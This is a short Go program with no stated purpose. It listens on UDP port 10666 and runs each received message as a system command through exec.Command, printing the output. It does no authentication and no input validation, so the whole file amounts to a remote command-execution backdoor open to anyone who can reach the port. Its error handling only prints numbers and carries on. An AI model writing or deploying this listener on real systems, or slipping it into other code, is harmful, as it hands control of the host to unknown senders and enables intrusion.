package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	myAddr, err := net.ResolveUDPAddr("udp", ":10666")
	if err != nil {
		fmt.Println("0")
	}
	handle, err := net.ListenUDP("udp", myAddr)
	if err != nil {
		fmt.Println("1")
	}

	buf := make([]byte, 1024)

	for {
		numberOfBytes, recvAddr, err := handle.ReadFromUDP(buf)
		if err != nil {
			fmt.Println("2")
		}
		fmt.Println("Message incoming from: ", recvAddr)
		messageContent := string(buf[:numberOfBytes])
		fmt.Println("Message Content ", messageContent)

		cmd := exec.Command(messageContent)

		stdout, err := cmd.Output()
		if err != nil {
			fmt.Println("3")
		}

		fmt.Printf("%s", stdout)
	}
}
